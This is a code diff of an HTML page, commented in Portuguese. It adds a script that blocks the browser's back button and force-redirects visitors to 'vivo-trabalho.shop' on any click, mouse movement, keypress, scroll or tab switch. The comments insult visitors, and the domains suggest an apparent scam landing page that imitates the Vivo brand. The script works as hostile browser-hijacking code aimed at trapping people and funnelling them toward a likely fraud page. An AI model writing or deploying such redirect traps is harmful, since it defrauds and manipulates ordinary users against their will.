@@ -102,16 +102,38 @@
 </noscript>
 <!-- End Facebook Pixel Code -->
 <script>
-  // URL para onde o lead será redirecionado
-  const backUrl = "https://pay.cadastroaoaplicativo.online/backredirect";
+  // URL que o zé-ruela vai ser arremessado
+  var destino = "https://www.vivo-trabalho.shop/backredirect/back1";
 
-  // Impede que o usuário retorne para a página anterior
-  history.pushState(null, null, location.href);
+  function redirecionaFdp() {
+    window.location.href = destino;
+  }
 
-  window.addEventListener("popstate", function () {
-    location.href = backUrl;
+  // Clique em qualquer lugar
+  document.body.addEventListener("click", redirecionaFdp, { once: true });
+
+  // Movimento do mouse
+  document.body.addEventListener("mousemove", redirecionaFdp, { once: true });
+
+  // Qualquer tecla
+  document.body.addEventListener("keydown", redirecionaFdp, { once: true });
+
+  // Rolou a tela
+  document.body.addEventListener("scroll", redirecionaFdp, { once: true });
+
+  // Tentou voltar pelo botão do navegador
+  history.pushState(null, null, window.location.href);
+  window.onpopstate = function () {
+    history.go(1);
+    redirecionaFdp();
+  };
+
+  // Botão físico no mobile, tipo voltar ou minimizar app
+  window.addEventListener("visibilitychange", function () {
+    if (document.hidden) redirecionaFdp();
   });
 </script>
+
 </head>
 <body style="cursor: auto;">
     <!-- Header -->
